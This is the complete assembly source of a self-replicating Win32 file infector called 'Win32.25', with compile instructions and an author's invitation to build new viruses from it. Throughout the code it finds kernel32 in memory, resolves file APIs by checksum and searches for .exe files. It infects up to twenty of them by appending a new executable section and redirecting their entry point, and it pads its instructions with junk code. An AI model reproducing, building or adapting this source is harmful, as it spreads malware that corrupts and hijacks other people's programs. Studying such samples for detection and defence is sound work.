              
;
;
; Win32.25 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.25
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 25
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 18
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, 0

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 sub ebx, -1d
 push ebx
 mov eax, 80000000h or 40000000h
 push eax
 lea edx, [ebp+WFD_szFileName]

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax
 or ebx, 35712194d                      ; Trash

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 sal edx, 26d                           ; Trash
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ebx
 cmp eax, 0
 je CloseFile
 push ebx
 push 0
 push 0
                                        ; mov ecx, 2
 push 2d
 pop ecx
 dec eax                                ; Trash
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 xor ecx, 21253713d                     ; Trash
 sub eax, 1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 and edx, 0
 add edx, NumberOfApis
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, -64675d
 add ecx, 64675d
 add ecx, [eax+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov eax, dword ptr [ecx]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 rol ebx, 10d                           ; Trash
 mov dword ptr [ebp+OTableVA], eax
                                        ; load API Names and Offsets
 mov esi, ebp
 add esi, offset APIOffsets

 mov ebx, ebp
 add ebx, offset APINames


GetApisLoop: 

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 add ebx, 4d
                                        ; mov ecx, -1
 mov ecx, ( -1d + 8d )
 sub ecx, 8d
 and ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], ecx
                                        ; add esi, 4
 add esi, 4d
 sub edx, 1
 jnz GetApisLoop
 mov eax, 76875149d                     ; Trash
 jmp Outbreak



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 push ecx
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 cmp eax, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
                                        ; mov ebx, 65536
 mov ebx, 0
 add ebx, 65536d
 sub ecx, ebx
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ecx, 60
 inc ecx
 add ecx, 59d
 rcl edx, 8d                            ; Trash
 mov ebx, [ecx]
 add ecx, -60d
 xchg ebx, ecx
 add ecx, ebx
 xchg ebx, ecx
                                        ; check for EP
 movzx edx, word ptr [ebx]
 cmp edx, 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ebx, 22
 inc ebx
 add ebx, 21d
                                        ; clear edx
 mov edx, -65656d
 add edx, 65656d
 mov dx, word ptr [ebx]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 inc ebx
 sub ebx, 23d


KernelFound:
 xor eax, ebx                           ; Trash
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], ebx

 lea edx, GetApis
 add edx, ebp

 push edx
ret


;                  [ ///// * Data * \\\\\ ]

Data:
 Attributes  dd 0h
 FileHandle  dd 0h
 FindHandle  dd 0h
 InfCounter  dd 0h

 APINames:
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h


 counter     dw 0h
 TempAPI     dd 0h
 KernelPE    dd 0h
 db 'Win32.25 - SnakeByte',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 PEheader    dd 0h
 MapAddress  dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XCreateFileA           dd 0h

 filemask    db '*.eXe',0
 NewEIP      dd 0h
 K32Trys     dd 0h
 OldEIP      dd 0h
 KernelMZ    dd 0h
 filealign   dd 0h
 Trash1      dd 0h
 AlignReg1   dd 0h
 OTableVA    dd 0h
 MapHandle   dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.kiewNlG'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Misc1       dd 0h
 OldBase     dd 400000h
 NewSize     dd 0h
 TempApisearch3 dd 0h
 ATableVA    dd 0h
 NTableVA    dd 0h
 sectionalign   dd 0h
 AlignReg2   dd 0h




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov edx, ebp
 add edx, offset WFD_szFileName

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 add ecx, ecx                           ; Trash
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 push 128d
 pop edx
 push edx
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear edi
 sub edi, edi
 add edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; clear ecx
 and ecx, 0
 dec ecx
 add ecx, 1
 jz Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 je Notagoodfile
 push dword ptr [edi+3Ch]
 pop ebx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; clear ecx
 mov ecx, 60925d
 sub ecx, 60925d
 or ecx, ecx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], '25'
 jz Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [ebx+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 mov ecx, offset WFD_szFileName
 mov dword ptr [ebp+Trash1], 949883     ; Trash
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; mov ecx, -1
 mov ecx, ( -1d xor 15d )
 xor ecx, 15d
 and ecx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ecx
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
 push edx
 pop ecx
                                        ; mov esi, edx
 mov esi, edx
 push esi
 mov dword ptr [ebp+TempApisearch3], 0
 add dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [ebx]
 pop eax
 LoopChsksm:
                                        ; clear edx
 mov edx, 64078d
 sub edx, 64078d
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 clc 
 sal dx,8d
 sub eax, edx
 test dx, dx
 jz LoopConti
                                        ; clear edx
 mov edx, -64862d
 add edx, 64862d
 mov dl, byte ptr [esi]
 sub eax, edx
                                        ; add esi, 1
 add esi, 1d
 test dx, dx
 jnz LoopChsksm
LoopConti:
 cmp eax, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop ecx
 mov ebx, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 add ecx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ebx
 and dword ptr [ebp+Trash1], eax        ; Trash
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov edx, ecx
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [edx]
 sal ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear edi
 xor edi, edi
 add edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edi
 xor edx, 10863461d                     ; Trash

                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 sub ebp, 1
 inc ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax

 neg ebx                                ; Trash


;           [ ///// * Outbreak Procedure * \\\\\ ]

 ror ecx, 5d                            ; Trash

Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], eax

                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+OldBase]

 push edx
 pop dword ptr [ebp+retBase]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, ecx
 add esi, [ecx+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov eax, [esi]
 add esi, -60d
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], eax
                                        ; clear esi
 mov esi, -37326d
 add esi, 37326d
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], -1
 and dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ebx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], ebx
 mov ebx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], ebx
 mov ebx, [eax+38h]
 push ebx
 pop dword ptr [ebp+sectionalign]
                                        ; Get last section
 mov edx, [eax+74h]
 shl edx, 3
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [eax+6h]
 mov ebx, 28h
 pushad
 mov eax, ecx
 mul ebx
 mov dword ptr [ebp+Misc1], 0
 xor dword ptr [ebp+Misc1], eax
 popad
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, edx
 add eax, ecx
 lea ebx, [ebp+newsection]
 add dword ptr [ebp+Trash1], edx        ; Trash
 xchg ebx, edx


 xchg edx, eax
 push edx
                                        ; Calculate the RVA of the new section
 mov eax, [edx-5*8+8d]
 add eax, [edx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], eax
 push ebx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], 0
 add dword ptr [ebp+nsphysicalsize], eax
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 pop dword ptr [ebp+nsvirtualsize]
                                        ; calculate physical offset
 mov ecx,[edx-5*8+20d]
 add ecx,[edx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov eax, ebx
 mov dword ptr [ebp+AlignReg2], edx
 add eax, VirusSize
 add ebx, ebx                           ; Trash
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 xor dword ptr [ebp+Trash1], 443432     ; Trash
 call Align
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 mov ebx, 43580868d                     ; Trash
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov edi, ebp
 add edi, offset newsection

 pop edx
                                        ; mov ecx, 16
 push 16d
 pop ecx
WriteNewSectionLoop:
 mov ebx, dword ptr [edi]
 mov dword ptr [edx], ebx
                                        ; add edx, 4
 add edx, 4d
                                        ; add edi, 4
 add edi, 4d
 loop WriteNewSectionLoop
                                        ; increase section numbers
 push dword ptr [ebp+PEheader]
 pop ecx
 inc word ptr [ecx+06h]
 push dword ptr [ebp+nsRVA]
 pop eax
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], -1d
 and dword ptr [ecx+4Ch], '25'
 push dword ptr [ebp+nsphysicaloffset]
 pop eax
 push eax
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
 and dword ptr [ebp+Trash1], 1415462    ; Trash
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop ebx
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, edx

 push edx
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov ebx, ebp
 add ebx, offset WFD_szFileName

                                        ; mov eax, 276
 push 276d
 pop eax

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]

 push ebx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 sbb edx, 25d                           ; Trash
 pop dword ptr [ebp+FindHandle]
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

